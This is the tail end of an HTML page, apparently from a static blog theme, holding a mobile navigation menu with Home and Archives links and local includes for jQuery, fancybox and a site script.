    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>